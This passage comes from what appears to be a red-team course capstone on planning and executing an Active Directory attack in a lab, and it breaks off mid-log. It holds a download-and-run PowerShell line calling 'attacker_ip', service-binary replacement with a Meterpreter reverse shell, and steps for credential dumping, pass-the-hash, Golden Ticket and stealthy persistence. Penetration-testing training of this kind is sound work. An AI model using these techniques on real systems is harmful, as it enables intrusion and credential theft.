practice:</p>\n<ul>\n<li>Are you allowed to modify system configurations permanently (except for persistence objectives)?</li>\n<li>Are you allowed to shut down systems? (Probably not).</li>\n<li>What is the starting point (the &quot;initial access&quot; context)? (e.g., &quot;You have a low-priv shell on WKSTN1&quot;).</li>\n</ul>\n<p><em>Define simple RoE for your lab.</em></p>\n</li>\n</ol>\n<h4>8.2.3 Intelligence Gathering &amp; Attack Path Mapping</h4>\n<p>This is where you leverage the skills from Modules 1-5, especially Module 5 (AD Enumeration and BloodHound).</p>\n<ul>\n<li><strong>Review your AD Data:</strong> Look at the BloodHound graph, your PowerView output, your <code>net</code> command results.</li>\n<li><strong>Identify High-Value Targets:</strong> Who are the Domain Admins? Where do they log in? What systems are critical?</li>\n<li><strong>Map Potential Paths:</strong> Use BloodHound queries or manually trace connections/privileges:<ul>\n<li>Shortest path from your starting point (initial access host/user) to your objective.</li>\n<li>Identify users or groups with excessive privileges.</li>\n<li>Find systems with potential misconfigurations (e.g., unconstrained delegation).</li>\n<li>Locate users vulnerable to credential attacks (Kerberoastable, AS-REP Roasting).</li>\n</ul>\n</li>\n<li><strong>Identify Choke Points:</strong> Are there systems or users that, if compromised, open up many paths?</li>\n</ul>\n<h4>8.2.4 Strategy Development</h4>\n<p>Based on your objective, scope, RoE, and intelligence, outline your plan. This isn&#39;t just a list of tools; it&#39;s a sequence of actions.</p>\n<ol>\n<li><strong>Starting Point:</strong> Where are you beginning? (e.g., Low-priv user <code>user.low</code> on <code>WKSTN1</code>).</li>\n<li><strong>Phase 1: Initial Foothold &amp; Local Recon:</strong> What commands/scripts will you run immediately to understand the local host? (<code>whoami</code>, <code>ipconfig</code>, <code>tasklist</code>, basic file checks). OpSec consideration: Use native tools first.</li>\n<li><strong>Phase 2: Local Enumeration &amp; PE:</strong> How will you look for local PE vectors? (<code>PowerUp</code>, <code>WinPEAS</code>, manual checks). What&#39;s your primary PE target? What&#39;s your backup? OpSec consideration: Use in-memory techniques if possible.</li>\n<li><strong>Phase 3: Credential Harvesting:</strong> How will you attempt to get credentials from the initial host <em>after</em> achieving local admin? (e.g., <code>Invoke-Mimikatz</code> via reflective PowerShell, dumping SAM/SECURITY hives). OpSec consideration: Dumping LSASS is high risk; prioritize other methods if feasible initially.</li>\n<li><strong>Phase 4: AD &amp; Network Recon:</strong> How will you gather more AD info from your new privileged shell? (<code>PowerView</code>, <code>SharpHound</code>). OpSec consideration: Run collectors carefully, consider timing.</li>\n<li><strong>Phase 5: Attack Path Execution &amp; Lateral Movement:</strong> Based on BloodHound/AD data, what&#39;s your <em>chosen</em> path to the objective? (e.g., User <code>svc_sql</code> is Kerberoastable -&gt; Crack hash -&gt; <code>svc_sql</code> is admin on <code>APP01</code> -&gt; PsExec to <code>APP01</code> -&gt; <code>APP01</code> has cached creds for <code>admin.da</code> -&gt; PtH to DC). List the specific lateral movement techniques you plan to use for each hop. OpSec consideration: Which LM methods are less noisy?</li>\n<li><strong>Phase 6: Reaching the Objective:</strong> What are the final steps? (e.g., If objective is DA, it might be <code>PtH</code> to the DC&#39;s <code>krbtgt</code> hash to forge a Golden Ticket).</li>\n<li><strong>Phase 7: Persistence (If objective includes it):</strong> How will you maintain access? (e.g., Create a scheduled task, modify a GPO, DCSync a backup DA account). OpSec consideration: Choose a persistence method least likely to be found.</li>\n<li><strong>Phase 8: Cleanup (Lab context):</strong> Revert VMs.</li>\n</ol>\n<p><em>Create a flowchart or detailed step-by-step list of your planned actions.</em> Include the <em>expected</em> tools/commands for each step. Have backup plans if a step fails.</p>\n<h3>Section 8.3: Execution (Capstone Phase 2)</h3>\n<p>This is where you put your plan into action in the lab environment.</p>\n<p><strong>Key Principles:</strong></p>\n<ul>\n<li><strong>Follow Your Plan:</strong> Start by executing the steps you outlined.</li>\n<li><strong>Document <em>Everything</em>:</strong> This is CRITICAL for your report. Don&#39;t just run commands; record them.</li>\n<li><strong>Be Flexible:</strong> Your plan <em>will</em> encounter unexpected issues. Systems might be configured differently, tools might fail, techniques might not work. Be ready to troubleshoot and adapt your plan on the fly using your knowledge from M1-7.</li>\n<li><strong>Practice OpSec:</strong> Be mindful of the noise you&#39;re making, even in the lab. If you planned a stealthy approach, stick to it.</li>\n<li><strong>Verify Each Step:</strong> Did the PE succeed? Did the lateral movement work? Did you get the credentials?</li>\n</ul>\n<h4>8.3.1 Step-by-Step Execution &amp; Documentation</h4>\n<p>This is the most important part of the execution phase for the Capstone. You need to capture <em>exactly</em> what you did.</p>\n<p><strong>Recommended Documentation Method:</strong></p>\n<p>Maintain a running log as you work. A simple text file, a Markdown file, or a tool like OneNote works well. For each action:</p>\n<ol>\n<li><strong>Timestamp:</strong> When did you perform the action?</li>\n<li><strong>Host:</strong> Which system are you currently operating on?</li>\n<li><strong>User Context:</strong> What user are you running as? (e.g., <code>low-priv-user</code>, <code>NT AUTHORITY\\SYSTEM</code>).</li>\n<li><strong>Action/Command:</strong> What did you do? (e.g., &quot;Attempting PE using Service X vulnerability&quot;, <code>powershell -ep bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://attacker_ip/PowerUp.ps1&#39;); Invoke-AllChecks&quot;</code>)</li>\n<li><strong>Result:</strong> What happened? Was it successful? Did it fail? What was the output? (Include command output or screenshots).</li>\n<li><strong>Analysis/Notes:</strong> What does this result tell you? What&#39;s the next step based on this? Did you deviate from the plan and why?</li>\n</ol>\n<p><strong>Example Log Snippet:</strong></p>\n<pre><code class=\"language-markdown\">---\n### Capstone Execution Log - Objective: Obtain DA\n\n**Starting Point:** Low-priv user `user.low` on `WKSTN1`.\n\n**[2023-10-27 10:05:00]**\n**Host:** WKSTN1\n**User:** CONTOSO\\user.low\n**Action:** Initial recon - check basic system info.\n**Command:** `systeminfo`\n**Result:** Output shows Windows 10 Pro, build xxxx. Domain joined to CONTOSO.COM. Patch level seems relatively recent.\n**Notes:** System is Windows 10. Need to identify specific build/missing patches later if kernel exploit is considered.\n\n**[2023-10-27 10:07:30]**\n**Host:** WKSTN1\n**User:** CONTOSO\\user.low\n**Action:** Check running processes for interesting targets or potential PE vectors.\n**Command:** `tasklist /svc`\n**Result:** Output lists services and their PIDs. See &#39;VulnerableService.exe&#39; running with PID 1234. Looks suspicious.\n**Notes:** Investigate &#39;VulnerableService.exe&#39;. Check its path and permissions.\n\n**[2023-10-27 10:15:00]**\n**Host:** WKSTN1\n**User:** CONTOSO\\user.low\n**Action:** Check permissions on &#39;VulnerableService.exe&#39; path.\n**Command:** `icacls &quot;C:\\Program Files\\Vulnerable Service&quot;`\n**Result:** Output shows &#39;BUILTIN\\Users:(F)&#39;. Full control for standard users! This is a PE vector.\n**Notes:** Plan changed: Pursue vulnerable service PE. Will attempt to replace the service binary.\n\n**[2023-10-27 10:20:00]**\n**Host:** WKSTN1\n**User:** CONTOSO\\user.low\n**Action:** Attempting to replace VulnerableService.exe with malicious binary (meterpreter shell reverse tcp, rename to VulnerableService.exe).\n**Command:** `copy C:\\Users\\user.low\\Desktop\\evil.exe &quot;C:\\Program Files\\Vulnerable Service\\VulnerableService.exe&quot;`\n**Result:** Copy successful!\n**Notes:** Now need to restart the service.\n\n**[2023-10-27 10:21:00]**\n**Host:** WKSTN1\n**User:** CONTOS
